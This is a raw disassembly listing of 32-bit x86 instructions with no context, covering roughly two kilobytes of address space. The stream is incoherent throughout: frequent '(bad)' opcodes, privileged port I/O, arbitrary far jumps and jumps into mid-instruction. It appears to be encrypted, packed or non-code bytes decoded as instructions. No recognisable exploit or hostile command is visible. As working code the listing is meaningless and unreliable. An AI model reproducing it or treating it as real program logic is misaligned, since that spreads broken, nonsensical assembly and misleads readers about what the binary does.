  410ac9:	in     al,dx
  410aca:	jmp    0xdbbe:0xccb5d1f9
  410ad1:	shr    eax,1
  410ad3:	mov    DWORD PTR [ebx],0xd603defe
  410ad9:	hlt    
  410ada:	xlat   BYTE PTR ds:[ebx]
  410adb:	out    dx,al
  410adc:	out    0xda,al
  410ade:	retf   
  410adf:	jmp    ecx
  410ae1:	retf   
  410ae2:	mov    esp,0xb1cbe2ad
  410ae7:	out    dx,eax
  410ae8:	fidivr DWORD PTR [ecx-0x442c172a]
  410aee:	cli    
  410aef:	xlat   BYTE PTR ds:[ebx]
  410af0:	fcmove st,st(4)
  410af2:	ret    0xc1f1
  410af5:	clc    
  410af6:	neg    edi
  410af8:	(bad)  
  410af9:	aam    0xff
  410afb:	in     al,0xd8
  410afd:	loop   0x410aee
  410aff:	in     eax,0xde
  410b01:	fcomp  st(6)
  410b03:	int3   
  410b04:	out    0xb0,al
  410b06:	retf   0xd4e3
  410b09:	fadd   st,st(5)
  410b0b:	mov    ah,0xf0
  410b0d:	div    BYTE PTR [ecx+esi*8-0x32310d17]
  410b14:	xlat   BYTE PTR ds:[ebx]
  410b15:	idiv   BYTE PTR [edx-0x2b030410]
  410b1b:	loopne 0x410ae1
  410b1d:	push   es
  410b1e:	fsub   st,st(7)
  410b20:	fcomip st,st(1)
  410b22:	scas   eax,DWORD PTR es:[edi]
  410b23:	jmp    0x410ad7
  410b25:	mov    bl,0xcf
  410b27:	shr    DWORD PTR [eax-0x112c163b],0xc8
  410b2e:	aam    0xf3
  410b30:	loop   0x410b21
  410b32:	clc    
  410b33:	mov    ebp,0xe1d203f3
  410b38:	jmp    0xc391217
  410b3d:	loop   0x410b17
  410b3f:	adc    ebx,edi
  410b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b42:	call   0xec15baf9
  410b47:	loop   0x410b31
  410b49:	leave  
  410b4a:	call   0xf51ec309
  410b4f:	aad    0xf2
  410b51:	sti    
  410b52:	rol    DWORD PTR [eax],0xf7
  410b55:	(bad)  
  410b57:	mov    ecx,0xfcddf9db
  410b5c:	add    edi,ecx
  410b5e:	out    dx,al
  410b5f:	add    al,0xc8
  410b61:	int    0xde
  410b63:	into   
  410b64:	into   
  410b65:	mov    cl,0xd1
  410b67:	(bad)  
  410b69:	retf   
  410b6a:	icebp  
  410b6b:	call   esi
  410b6d:	in     eax,0xf3
  410b6f:	std    
  410b70:	stc    
  410b71:	mov    esp,0xd3dcc2ba
  410b76:	cld    
  410b77:	add    al,0xc3
  410b79:	or     ebp,ecx
  410b7b:	(bad)
  410b7e:	fdivp  st(0),st
  410b80:	icebp  
  410b81:	shl    DWORD PTR [edx-0x16361a35],1
  410b87:	lock repnz repz fcom st(3)
  410b8c:	hlt    
  410b8d:	cmc    
  410b8e:	mov    ebp,0xcdddb4bb
  410b93:	shl    dh,1
  410b95:	loop   0x410b5c
  410b97:	add    ah,bl
  410b99:	fdivp  st(5),st
  410b9b:	fimul  WORD PTR [ecx]
  410b9d:	out    0xe6,al
  410b9f:	dec    BYTE PTR [ebx]
  410ba1:	retf   0xced3
  410ba4:	retf   0xc8d2
  410ba7:	int    0xc6
  410ba9:	aad    0xe0
  410bab:	ror    ah,1
  410bad:	retf   0xe2b8
  410bb0:	loope  0x410ba3
  410bb2:	ret    
  410bb3:	rcl    ebx,0xd4
  410bb6:	jmp    0x410bbb
  410bb8:	clc    
  410bb9:	loop   0x410bb9
  410bbb:	leave  
  410bbc:	aam    0xf9
  410bbe:	leave  
  410bbf:	fcompp 
  410bc1:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bc3:	out    dx,eax
  410bc4:	div    DWORD PTR [eax-0x240d5632]
  410bca:	fcom   st(0)
  410bcc:	lds    edi,FWORD PTR [ebx-0x2ffc0f12]
  410bd2:	mov    edx,0xfae5cc
  410bd7:	jmp    0x410bd2
  410bd9:	aad    0xc5
  410bdb:	idiv   ecx
  410bdd:	in     eax,dx
  410bde:	jecxz  0x410bec
  410be0:	leave  
  410be1:	mov    cl,0xeb
  410be3:	jmp    0xc0f3e8c5
  410be8:	(bad)  
  410be9:	imul   cl
  410beb:	lock int3 
  410bed:	int    0xdb
  410bef:	neg    esi
  410bf1:	fcmovb st,st(3)
  410bf3:	mov    ch,0xf6
  410bf5:	inc    BYTE PTR [ebx]
  410bf7:	test   ebp,0xc0fe00e9
  410bfd:	or     edi,esp
  410bff:	int    0xcc
  410c01:	out    0xcf,eax
  410c03:	out    0xbc,eax
  410c05:	scas   eax,DWORD PTR es:[edi]
  410c06:	leave  
  410c07:	out    0xc8,al
  410c09:	in     al,0xea
  410c0b:	shr    dl,1
  410c0d:	lock leave 
  410c0f:	push   edx
  410c11:	add    al,BYTE PTR [edx]
  410c13:	repz out 0xfa,al
  410c16:	add    BYTE PTR [ebx],al
  410c18:	fucom  st(5)
  410c1a:	add    BYTE PTR [esi],cl
  410c1c:	out    dx,eax
  410c1d:	(bad)  
  410c1e:	(bad)  
  410c20:	fidiv  DWORD PTR [ecx-0x1e155011]
  410c26:	rol    bl,cl
  410c28:	(bad)  
  410c29:	iret   
  410c2a:	iret   
  410c2b:	(bad)  
  410c2c:	fucomip st,st(0)
  410c2e:	icebp  
  410c2f:	into   
  410c30:	ffree  st(3)
  410c32:	cmc    
  410c33:	mov    esp,0xc1dde2e5
  410c38:	(bad)  
  410c39:	(bad)  
  410c3a:	xlat   BYTE PTR ds:[ebx]
  410c3b:	out    0xe4,eax
  410c3d:	or     al,0xb
  410c3f:	loope  0x410c32
  410c41:	fsub   st(5),st
  410c43:	mov    edi,0xeac1ccb1
  410c48:	hlt    
  410c49:	fyl2xp1 
  410c4b:	fsubr  st,st(7)
  410c4d:	(bad)  
  410c4f:	mov    edx,0xbebebbf2
  410c54:	into   
  410c55:	sti    
  410c56:	fcmovnu st,st(0)
  410c58:	ret    0xda03
  410c5b:	jecxz  0x410c38
  410c5d:	or     eax,0xea02cd07
  410c62:	leave  
  410c63:	lods   al,BYTE PTR ds:[esi]
  410c64:	(bad)
  410c67:	repz hlt 
  410c69:	neg    bh
  410c6b:	iret   
  410c6c:	cli    
  410c6d:	mov    ah,0xee
  410c6f:	fucomip st,st(4)
  410c71:	mov    esi,0xf2eee7fc
  410c76:	std    
  410c77:	add    ebx,ebx
  410c79:	(bad)  
  410c7b:	pmulhw mm3,mm6
  410c7e:	retf   0xccfb
  410c81:	(bad)
  410c84:	out    dx,eax
  410c85:	rol    esp,0xbb
  410c88:	div    DWORD PTR [ebp-0x1b371147]
  410c8e:	sti    
  410c8f:	mov    esp,0xecced4d5
  410c94:	sar    bh,cl
  410c96:	loop   0x410c90
  410c98:	or     ebx,ebx
  410c9a:	pmulhuw mm0,QWORD PTR [eax]
  410c9d:	or     al,0xed
  410c9f:	jmp    0x410c6b
  410ca1:	leave  
  410ca2:	(bad)  
  410ca3:	shl    DWORD PTR [ecx-0x351c2e40],cl
  410ca9:	in     al,0xb5
  410cab:	in     al,dx
  410cac:	icebp  
  410cad:	int    0xcf
  410caf:	jecxz  0x410ca5
  410cb1:	sar    ebp,cl
  410cb3:	mov    ebp,0xb9bed2fb
  410cb8:	call   edi
  410cba:	or     eax,ebp
  410cbc:	std    
  410cbd:	in     eax,dx
  410cbe:	jmp    0x410cc0
  410cc0:	push   cs
  410cc1:	enter  0xa9aa,0xd7
  410cc5:	div    DWORD PTR [eax-0x454a174a]
  410ccb:	in     al,0xd9
  410ccd:	fcmovnu st,st(5)
  410ccf:	mov    edx,0xc1e1d8c3
  410cd4:	fnstsw WORD PTR [ebx+0x9ebd1d6]
  410cda:	jecxz  0x410cbe
  410cdc:	jmp    0xe3c7:0xeae3c909
  410ce3:	not    cl
  410ce5:	lock repz out dx,al
  410ce8:	cmc    
  410ce9:	mov    cl,0xcf
  410ceb:	in     eax,dx
  410cec:	int    0xf3
  410cee:	shl    DWORD PTR [esi+ebx*8-0x381d0b00],cl
  410cf5:	in     al,dx
  410cf6:	sar    BYTE PTR [ebp+eax*8+0x7feca08],0xd4
  410cfe:	leave  
  410cff:	fsubrp st(2),st
  410d01:	mov    edi,0xeedeb1f0
  410d06:	shl    eax,cl
  410d08:	test   al,0xd8
  410d0a:	mov    bh,0xdf
  410d0c:	rcr    esi,1
  410d0e:	mov    eax,0x1d4b8ba
  410d13:	shl    dh,cl
  410d15:	int    0xfc
  410d17:	jecxz  0x410ce0
  410d19:	out    0xc9,al
  410d1b:	fcmove st,st(0)
  410d1d:	(bad)  
  410d1f:	(bad)  
  410d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d22:	loop   0x410ce8
  410d24:	scas   al,BYTE PTR es:[edi]
  410d25:	lds    ebp,FWORD PTR [ebp-0x4f454e3e]
  410d2b:	mov    edi,0xefd2ece6
  410d30:	iret   
  410d31:	mov    edx,0xc6d9f0d5
  410d36:	fld    DWORD PTR [ebx]
  410d38:	(bad)  
  410d3a:	(bad)  
  410d3b:	std    
  410d3c:	add    ah,dl
  410d3e:	or     al,0xc5
  410d40:	or     eax,0xf3cbc7be
  410d45:	jmp    0x410d17
  410d47:	iret   
  410d48:	int    0xd9
  410d4a:	mov    ebx,0xeec4f9d2
  410d4f:	mov    edx,0xdc03f1ec
  410d54:	fiadd  WORD PTR [edx]
  410d56:	rol    DWORD PTR [ebx],cl
  410d58:	(bad)  
  410d59:	leave  
  410d5a:	(bad)  
  410d5c:	(bad)  
  410d5e:	cli    
  410d5f:	add    al,0xea
  410d61:	fdiv   st,st(1)
  410d63:	jmp    0xdaeb:0xf0ebd4c1
  410d6a:	repnz div eax
  410d6d:	retf   0xd6bb
  410d70:	jecxz  0x410d4a
  410d72:	rcl    bh,0xfe
  410d75:	idiv   ecx
  410d77:	ret    
  410d78:	mov    eax,0xe9e5c40b
  410d7d:	or     bl,bh
  410d7f:	adc    ch,ah
  410d81:	mov    esi,0xd4b6e3c1
  410d86:	iret   
  410d87:	loopne 0x410d54
  410d89:	mov    ch,0xb1
  410d8b:	lock (bad) 
  410d8d:	leave  
  410d8e:	out    dx,eax
  410d8f:	mov    ebx,0xf8ccd9ba
  410d94:	fstp   st(5)
  410d96:	clc    
  410d97:	rcl    bh,cl
  410d99:	stc    
  410d9a:	verr   di
  410d9d:	or     al,0xc5
  410d9f:	or     eax,0xc6ddbcea
  410da4:	fdivrp st(0),st
  410da6:	loopne 0x410d9e
  410da8:	mov    dh,0xd8
  410daa:	int3   
  410dab:	(bad)  
  410dac:	out    0xd9,al
  410dae:	mov    edi,0xcdf4c2fe
  410db3:	imul   ebp
  410db5:	aam    0xc0
  410db7:	rol    al,cl
  410db9:	rcr    esi,1
  410dbb:	std    
  410dbc:	add    dl,cl
  410dbe:	out    0xf2,al
  410dc0:	jecxz  0x410d9b
  410dc2:	iret   
  410dc3:	jecxz  0x410d7b
  410dc5:	retf   
  410dc6:	shl    bl,0xb7
  410dc9:	scas   eax,DWORD PTR es:[edi]
  410dca:	lock dec ah
  410dcd:	div    DWORD PTR [ebp-0x2b200e2e]
  410dd3:	mov    ch,0xd1
  410dd5:	hlt    
  410dd6:	(bad)  
  410dd7:	xlat   BYTE PTR ds:[ebx]
  410dd8:	cmc    
  410dd9:	lock (bad) 
  410ddb:	test   BYTE PTR [edi],0xe7
  410dde:	leave  
  410ddf:	stc    
  410de0:	in     eax,0xc7
  410de2:	call   0xecf6daaa
  410de7:	int    0xe7
  410de9:	jmp    0xf8b5:0xfaedbbca
  410df0:	(bad)  
  410df2:	loope  0x410db7
  410df4:	mov    edi,0xfbf9f003
  410df9:	retf   
  410dfa:	or     al,bh
  410dfc:	add    al,0xff
  410dfe:	fld    DWORD PTR [esi+eax*1]
  410e01:	out    dx,al
  410e02:	mov    cl,0xc3
  410e04:	out    dx,al
  410e05:	loope  0x410dbe
  410e07:	loopne 0x410dbe
  410e09:	(bad)
  410e0c:	dec    bh
  410e0e:	(bad)  
  410e0f:	enter  0xf2cc,0xf9
  410e13:	ret    0xe6d3
  410e16:	test   dh,0xe0
  410e19:	ret    0xf507
  410e1c:	out    dx,eax
  410e1d:	push   cs
  410e1e:	retf   
  410e1f:	int3   
  410e20:	fsub   st(5),st
  410e22:	into   
  410e23:	jmp    0xefeb:0xc2d1d6c5
  410e2a:	stc    
  410e2b:	(bad)  
  410e2c:	out    dx,eax
  410e2d:	fcmove st,st(1)
  410e2f:	mov    esi,0xe1f6e9f2
  410e34:	fucom  st(6)
  410e36:	loopne 0x410e0e
  410e38:	lock fcmovnb st,st(7)
  410e3b:	add    cl,BYTE PTR [eax]
  410e3d:	cld    
  410e3e:	(bad)  
  410e3f:	repnz loopne 0x410e21
  410e42:	in     al,dx
  410e43:	jmp    0x410e37
  410e45:	(bad)  
  410e46:	mov    bh,0xf5
  410e48:	(bad)  
  410e4a:	(bad)  
  410e4b:	mov    edx,0xfabef9b6
  410e50:	aad    0xcf
  410e52:	(bad)  
  410e53:	add    esi,eax
  410e55:	aam    0xbc
  410e57:	(bad)  
  410e58:	fdivr  st,st(7)
  410e5a:	stc    
  410e5b:	fcmovu st,st(6)
  410e5d:	enter  0xfd0e,0xda
  410e61:	int    0xd0
  410e63:	scas   eax,DWORD PTR es:[edi]
  410e64:	retf   0xb4cb
  410e67:	mov    dl,0xca
  410e69:	jmp    0xb9f5:0xd4b8f4c5
  410e70:	icebp  
  410e71:	shl    bh,1
  410e73:	add    dh,bh
  410e75:	cmc    
  410e76:	loop   0x410e56
  410e78:	(bad)  
  410e79:	std    
  410e7a:	in     eax,0xc5
  410e7c:	std    
  410e7d:	leave  
  410e7e:	retf   0xedfb
  410e81:	in     eax,dx
  410e82:	jmp    0xd3ad:0xe8cbcce0
  410e89:	lds    esi,FWORD PTR [ebx+esi*8-0x2f322205]
  410e90:	call   0xfb3de752
  410e95:	int3   
  410e96:	loope  0x410e9d
  410e98:	lds    ecx,FWORD PTR [edx]
  410e9a:	test   DWORD PTR [ebx+edi*8],0xf202ef00
  410ea1:	in     al,dx
  410ea2:	shl    bl,1
  410ea4:	repnz (bad) 
  410ea6:	stos   BYTE PTR es:[edi],al
  410ea7:	(bad)  
  410ea8:	enter  0xd4ce,0xf5
  410eac:	les    edi,FWORD PTR [ecx-0x2c302722]
  410eb2:	pop    es
  410eb3:	fiadd  DWORD PTR [eax]
  410eb5:	mov    esi,0xbff5f4e3
  410eba:	add    edi,ebp
  410ebc:	fndisi(8087 only) 
  410ebe:	out    0xc1,eax
  410ec0:	in     eax,dx
  410ec1:	ret    
  410ec2:	ret    
  410ec3:	fucomp st(1)
  410ec5:	lods   al,BYTE PTR ds:[esi]
  410ec6:	rol    ebx,0xfa
  410ec9:	(bad)  
  410eca:	fdivr  st,st(6)
  410ecc:	lock fcmovbe st,st(3)
  410ecf:	mov    ebp,0xf5b6cdf1
  410ed4:	mov    edi,0xc7f2d4d2
  410ed9:	add    esi,edx
  410edb:	(bad)  
  410edd:	out    0xf3,al
  410edf:	stc    
  410ee0:	add    ecx,eax
  410ee2:	jmp    0xe62af7d1
  410ee7:	mov    dl,0xac
  410ee9:	mov    ch,0xc8
  410eeb:	repz repnz lock fninit 
  410ef0:	(bad)  
  410ef1:	std    
  410ef2:	lock rol dl,1
  410ef5:	(bad)  
  410ef7:	sti    
  410ef8:	(bad)  
  410ef9:	aam    0xd6
  410efb:	in     al,0x3
  410efd:	aam    0x13
  410eff:	adc    cl,BYTE PTR [ecx]
  410f01:	mov    esi,0xecb6d6d3
  410f06:	jecxz  0x410eed
  410f08:	enter  0xb8d7,0xf3
  410f0c:	enter  0xc4f1,0xd3
  410f10:	add    ecx,esp
  410f12:	fnop   
  410f14:	out    0x6,eax
  410f16:	fadd   DWORD PTR [eax]
  410f18:	(bad)  
  410f19:	aam    0xea
  410f1b:	aam    0xfe
  410f1d:	dec    bh
  410f1f:	or     eax,0xf0c0cce8
  410f24:	mul    dh
  410f26:	ret    
  410f27:	xlat   BYTE PTR ds:[ebx]
  410f28:	neg    ecx
  410f2a:	int    0xb1
  410f2c:	out    dx,al
  410f2d:	icebp  
  410f2e:	neg    edx
  410f30:	jmp    0xfc41032a
  410f35:	fcmovu st,st(0)
  410f37:	retf   
  410f38:	(bad)  
  410f3a:	pop    es
  410f3b:	add    DWORD PTR [edi],eax
  410f3d:	lds    eax,FWORD PTR [edx]
  410f3f:	add    bh,dh
  410f41:	mov    ecx,0xd1b6f2bc
  410f46:	leave  
  410f47:	cmc    
  410f48:	icebp  
  410f49:	aad    0xe5
  410f4b:	(bad)  
  410f4c:	(bad)  
  410f4d:	(bad)  
  410f4f:	(bad)  
  410f50:	call   0xfa03de42
  410f55:	ret    
  410f56:	int3   
  410f57:	loop   0x410f36
  410f59:	in     al,0xfd
  410f5b:	push   cs
  410f5c:	std    
  410f5d:	or     eax,edi
  410f5f:	retf   0xbcd8
  410f62:	out    0xde,eax
  410f64:	mov    dl,0xc2
  410f66:	in     eax,dx
  410f67:	icebp  
  410f68:	out    dx,eax
  410f69:	int    0xe9
  410f6b:	out    dx,al
  410f6c:	(bad)  
  410f6d:	jmp    0xf2c3:0xfec2e8fd
  410f74:	sar    esp,1
  410f76:	ret    0xe4e0
  410f79:	cld    
  410f7a:	aad    0xd8
  410f7c:	retf   0xf9cb
  410f7f:	add    eax,0xebdfdde8
  410f84:	loopne 0x410f53
  410f86:	jmp    0x410f7e
  410f88:	mov    bl,0xbb
  410f8a:	mov    bh,0xba
  410f8c:	(bad)  
  410f8d:	mov    bh,0xb2
  410f8f:	(bad)  
  410f91:	enter  0x6b9,0xb4
  410f95:	stc    
  410f96:	jecxz  0x410f88
  410f98:	out    0xf0,al
  410f9a:	cli    
  410f9b:	clts   
  410f9d:	add    eax,0xc4d200c2
  410fa2:	leave  
  410fa3:	loop   0x410f62
  410fa5:	icebp  
  410fa6:	out    dx,eax
  410fa7:	(bad)  
  410fa8:	in     al,dx
  410fa9:	mov    al,0xd8
  410fab:	clc    
  410fac:	out    dx,al
  410fad:	fcmovu st,st(1)
  410faf:	jmp    0x410f86
  410fb1:	aad    0xb6
  410fb3:	fld    DWORD PTR [esi]
  410fb5:	in     eax,dx
  410fb6:	mov    ebp,0xc0f104f9
  410fbb:	shl    ah,0xb
  410fbe:	(bad)  
  410fc0:	out    dx,eax
  410fc1:	out    dx,eax
  410fc2:	retf   
  410fc3:	jmp    0xb30cc27a
  410fc8:	mov    edx,0xfdf3faca
  410fcd:	in     al,0x3
  410fcf:	mov    ch,0xce
  410fd1:	mov    ebx,0xd4c0efd9
  410fd6:	ret    0xc2d7
  410fd9:	add    eax,0xeebcf8d0
  410fde:	out    dx,eax
  410fdf:	dec    cl
  410fe1:	jmp    0xccdc:0xcfb6c4e6
  410fe8:	in     al,dx
  410fe9:	(bad)  
  410fea:	into   
  410feb:	imul   ah
  410fed:	retf   0xdfeb
  410ff0:	repnz repnz mov ecx,0xd1d9d2c0
  410ff7:	icebp  
  410ff8:	shl    dl,0xca
  410ffb:	std    
  410ffc:	in     al,0xb
  410ffe:	add    cl,BYTE PTR ds:0xe9afc70c
  411004:	test   al,0xf4
  411006:	ret    
  411007:	cli    
  411008:	sti    
  411009:	jmp    0x411005
  41100b:	hlt    
  41100c:	fnsave [ebp-0x26fe0237]
  411012:	out    0xcd,eax
  411014:	in     eax,0xde
  411016:	hlt    
  411017:	(bad)
  41101a:	(bad)  
  41101b:	stc    
  41101c:	mov    esp,0xea0407e6
  411021:	repz xlat BYTE PTR ds:[ebx]
  411023:	mov    bl,0xf3
  411025:	shl    cl,1
  411027:	idiv   edx
  411029:	mov    dh,0xc5
  41102b:	enter  0xf6d9,0xba
  41102f:	aam    0xf4
  411031:	(bad)  
  411033:	mov    edi,0xf805e5f0
  411038:	mov    esp,0xc7f4c6c0
  41103d:	push   es
  41103e:	retf   0xf2ff
  411041:	(bad)  
  411042:	mov    edi,0xaae7ccdc
  411047:	(bad)  
  411048:	loope  0x411030
  41104a:	mov    dh,0xec
  41104c:	mov    edi,0xefd1eed1
  411051:	fdivr  DWORD PTR [esi+0x7f3f9cc]
  411057:	fcmovb st,st(2)
  411059:	hlt    
  41105a:	hlt    
  41105b:	jmp    0x411056
  41105d:	int    0xfd
  41105f:	fcmove st,st(2)
  411061:	int    0xe3
  411063:	out    dx,al
  411064:	out    dx,al
  411065:	aam    0xc5
  411067:	mov    al,0xe2
  411069:	iret   
  41106a:	cli    
  41106b:	dec    bl
  41106d:	jmp    0xda1a0136
  411072:	cld    
  411073:	loope  0x411049
  411075:	hlt    
  411076:	ret    
  411077:	out    0xf0,al
  411079:	push   es
  41107a:	add    al,0xeb
  41107c:	jmp    0x411041
  41107e:	jmp    0xae21dc68
  411083:	(bad)  
  411085:	ret    
  411086:	out    0xc2,al
  411088:	into   
  411089:	repnz retf 
  41108b:	cmc    
  41108c:	call   0xd532cf50
  411091:	jmp    0xf3fe0b8b
  411096:	(bad)  
  411097:	mov    ebp,0xe40403ff
  41109c:	jmp    0xeb53e595
  4110a1:	fucomip st,st(7)
  4110a3:	mov    esp,0xc1f4e4d1
  4110a9:	enter  0xfaf4,0xbe
  4110ad:	in     al,0xd6
  4110af:	int    0xb9
  4110b1:	shl    ch,cl
  4110b3:	out    dx,eax
  4110b4:	mov    ah,0xc0
  4110b6:	(bad)  
  4110b7:	neg    esp
  4110b9:	aam    0xe2
  4110bb:	(bad)  
  4110bc:	iret   
  4110bd:	(bad)
  4110c0:	out    dx,eax
  4110c1:	retf   0xe7e6
  4110c4:	lds    esi,FWORD PTR [edi-0x2f321640]
  4110ca:	enter  0xfeb0,0xee
  4110ce:	neg    ah
  4110d0:	aam    0xc1
  4110d2:	icebp  
  4110d3:	mov    esp,0x7bee2bc
  4110d8:	rcr    esp,1
  4110da:	fld    QWORD PTR [ecx]
  4110dc:	or     ebx,eax
  4110de:	sti    
  4110df:	jmp    0xf0d5:0xe8c7e807
  4110e6:	lock mov dh,0xb5
  4110e9:	rcr    dl,cl
  4110eb:	mov    ch,0xdd
  4110ed:	repnz aad 0xd8
  4110f0:	ror    dh,cl
  4110f2:	cld    
  4110f3:	push   es
  4110f4:	fucom  st(1)
  4110f6:	cli    
  4110f7:	xlat   BYTE PTR ds:[ebx]
  4110f8:	add    eax,0xcac9e8f7
  4110fd:	jmp    0xd01bd2cc
  411102:	repz div bh
  411105:	mov    dh,0xc8
  411107:	mov    ebx,0xf7d9c4f1
  41110c:	lds    edi,FWORD PTR [ebp-0x40082b29]
  411112:	icebp  
  411113:	out    0xbc,al
  411115:	icebp  
  411116:	jmp    0x4110d8
  411118:	jmp    0xda50e9f7
  41111d:	or     ch,cl
  41111f:	stc    
  411120:	add    cl,ah
  411122:	mov    al,0xb2
  411124:	in     al,dx
  411125:	mov    esp,0xafc0c1d5
  41112a:	mov    dl,0xdb
  41112c:	shl    esi,1
  41112e:	mov    esi,0xe2dbc2b1
  411133:	int3   
  411134:	cmc    
  411135:	fprem1 
  411137:	add    al,0xf4
  411139:	aam    0xc9
  41113b:	clc    
  41113c:	jmp    0x411137
  41113e:	push   cs
  41113f:	retf   0xe109
  411142:	loop   0x411114
  411144:	scas   eax,DWORD PTR es:[edi]
  411145:	repnz into 
  411147:	div    DWORD PTR [edx-0x601142f]
  41114d:	repz enter 0xdefc,0x0
  411152:	jecxz  0x41114b
  411154:	into   
  411155:	mov    esi,0x1c0fedb
  41115a:	out    dx,eax
  41115b:	xlat   BYTE PTR ds:[ebx]
  41115c:	fmul   st(3),st
  41115e:	(bad)  
  41115f:	out    dx,al
  411160:	out    0xa9,eax
  411162:	(bad)  
  411163:	retf   0xb6ec
  411166:	(bad)
  411169:	aad    0xb7
  41116b:	xlat   BYTE PTR ds:[ebx]
  41116c:	enter  0xbcf6,0xf0
  411170:	aam    0xc8
  411172:	ret    
  411173:	into   
  411174:	mov    esp,0xc7f3d5ec
  411179:	(bad)  
  41117b:	(bad)  
  41117f:	add    eax,0xf0eab3fe
  411184:	rol    bh,1
  411186:	ror    ebx,1
  411188:	in     al,0xea
  41118a:	(bad)
  41118d:	hlt    
  41118e:	in     al,0xd2
  411190:	(bad)  
  411191:	mov    esp,0xfaf2bdd6
  411196:	add    eax,0xdcfbfdf2
  41119b:	out    dx,eax
  41119c:	clc    
  41119d:	into   
  41119e:	jecxz  0x41118b
  4111a0:	clc    
  4111a1:	leave  
  4111a2:	retf   
  4111a3:	in     eax,dx
  4111a4:	mov    dl,0xcd
  4111a6:	out    dx,al
  4111a7:	retf   
  4111a8:	mov    bh,0xce
  4111aa:	sar    BYTE PTR [ebx-0x122f400c],0xfd
  4111b1:	(bad)  
  4111b2:	(bad)  
  4111b3:	stc    
  4111b4:	loope  0x41118d
  4111b6:	(bad)  
  4111b8:	ret    0xd0fc
  4111bb:	(bad)  
  4111bd:	pop    es
  4111be:	push   es
  4111bf:	les    ecx,FWORD PTR [eax]
  4111c1:	ret    
  4111c2:	iret   
  4111c3:	lods   eax,DWORD PTR ds:[esi]
  4111c4:	scas   eax,DWORD PTR es:[edi]
  4111c5:	enter  0xebd7,0xba
  4111c9:	fcmovnb st,st(0)
  4111cb:	int    0xac
  4111cd:	in     al,dx
  4111ce:	mov    eax,0xe8dce9dc
  4111d3:	fsub   st,st(2)
  4111d5:	inc    esi
  4111d7:	ret    
  4111d8:	(bad)
  4111db:	fsub   st,st(6)
  4111dd:	lds    ecx,FWORD PTR [esi]
  4111df:	or     edi,eax
  4111e1:	lods   al,BYTE PTR ds:[esi]
  4111e2:	repnz mov al,0xe7
  4111e5:	out    0xce,al
  4111e7:	mov    ch,0xb7
  4111e9:	mov    edx,0xd2f6febb
  4111ee:	std    
  4111ef:	shl    ebp,cl
  4111f1:	repz mov dh,0xf2
  4111f4:	repz add eax,0xe6f7f9da
  4111fa:	leave  
  4111fb:	ffree  st(7)
  4111fd:	cmc    
  4111fe:	in     al,0xdf
  411200:	call   0xc11eddc6
  411205:	jmp    0x4111ce
  411207:	mov    dl,0xba
  411209:	(bad)  
  41120b:	xlat   BYTE PTR ds:[ebx]
  41120c:	repnz idiv ecx
  41120f:	out    dx,al
  411210:	add    esi,ecx
  411212:	out    0xe1,eax
  411214:	add    dh,dh
  411216:	mov    edx,0x2fbfbe7
  41121b:	retf   
  41121c:	enter  0xe4f8,0xff
  411220:	fsub   st(1),st
  411222:	rol    cl,1
  411224:	ror    edx,cl
  411226:	xlat   BYTE PTR ds:[ebx]
  411227:	mov    bh,0xec
  41122a:	imul   dl
  41122c:	out    dx,eax
  41122d:	jmp    0xfe42e7ff
  411232:	fcmovbe st,st(0)
  411234:	fcmovb st,st(2)
  411236:	std    
  411237:	out    0xd2,eax
  411239:	or     BYTE PTR [eax],al
  41123b:	(bad)  
  41123d:	enter  0xdeca,0x3
  411241:	ror    dl,cl
  411243:	in     eax,0xcf
  411245:	call   0xf60bc30b
  41124a:	in     eax,dx
  41124b:	shr    cl,cl
  41124d:	leave  
  41124e:	jecxz  0x411239
  411250:	ret    
  411251:	neg    esi
  411253:	add    dh,BYTE PTR [esp+ebp*8-0x2e3b192b]
  41125a:	loopne 0x411234
  41125c:	fcmovu st,st(4)
  41125e:	out    0x13,eax
  411260:	in     eax,0xd2
  411262:	in     eax,0xe4
  411264:	out    dx,eax
  411265:	out    0xd6,eax
  411267:	shl    DWORD PTR [ebp-0x46050011],1
  41126d:	sar    ch,1
  41126f:	(bad)  
  411271:	in     eax,dx
  411272:	loope  0x411254
  411274:	cmc    
  411275:	fadd   st(0),st
  411277:	shl    ah,cl
  411279:	loopne 0x411242
  41127b:	mov    ebp,0x3d8ed02
  411280:	out    0xaa,eax
  411282:	shr    DWORD PTR [esp+edi*4-0x4414554b],cl
  411289:	mov    dl,0xea
  41128b:	mov    al,0xf8
  41128d:	hlt    
  41128e:	jmp    0xc001:0xdac8dff9
  411295:	in     eax,0xdd
  411297:	std    
  411298:	jmp    esi
  41129a:	fiadd  WORD PTR [edi]
  41129c:	(bad)  
  41129d:	cld    
  41129e:	int    0x4
  4112a0:	fbld   TBYTE PTR [edi-0x23212154]
  4112a6:	ret    
  4112a7:	cmc    
  4112a8:	ret    0xd9e4
  4112ab:	fcmove st,st(3)
  4112ad:	in     al,dx
  4112ae:	clc    
  4112af:	fxch   st(0)
  4112b1:	(bad)  
  4112b2:	call   0xfa38c773
  4112b7:	test   eax,0xf8c9c9dd
  4112bd:	sti    
  4112be:	std    
  4112bf:	jmp    0x4112bf
  4112c1:	(bad)  
  4112c2:	mov    edi,0xd3e1f0b7
  4112c7:	(bad)
  4112cb:	mov    eax,0xcebeece4
  4112d0:	fdivr  st,st(0)
  4112d2:	ror    ch,1
  4112d4:	loope  0x4112ba
  4112d6:	add    esi,eax
  4112d8:	ret    0xea04
  4112db:	inc    DWORD PTR ds:0xf9e20ff8
  4112e1:	(bad)  
  4112e3:	call   0xf42be4dd
  4112e8:	out    0xfa,al
  4112ea:	les    edi,FWORD PTR [edx-0x2c340e12]
  4112f0:	fcmovnb st,st(3)
  4112f2:	stc    
  4112f3:	sti    
  4112f4:	mov    esp,0xdee0f4f4
  4112f9:	out    0x2,al
  4112fb:	mov    ebp,0xfe130ccf
  411300:	add    esp,esp
  411302:	in     eax,0xe4
  411304:	iret   
  411305:	mov    ch,0xe6
  411307:	enter  0xb1cf,0xba
  41130b:	mov    dh,0xc9
  41130d:	enter  0xd8bc,0xfe
  411311:	mov    edx,0x700dfba
  411316:	in     al,0xf6
  411318:	sar    ah,1
  41131a:	psubsb mm5,mm7
  41131d:	(bad)  
  41131e:	fadd   DWORD PTR [edx]
  411320:	(bad)  
  411322:	mov    edi,0xc5e7f3f7
  411327:	rcl    bl,cl
  411329:	mov    ecx,0xf6cdf5e0
  41132e:	inc    DWORD PTR [ebx]
  411330:	mov    esp,0xddf1d2d2
  411335:	lock add bh,dh
  411338:	or     edi,ebx
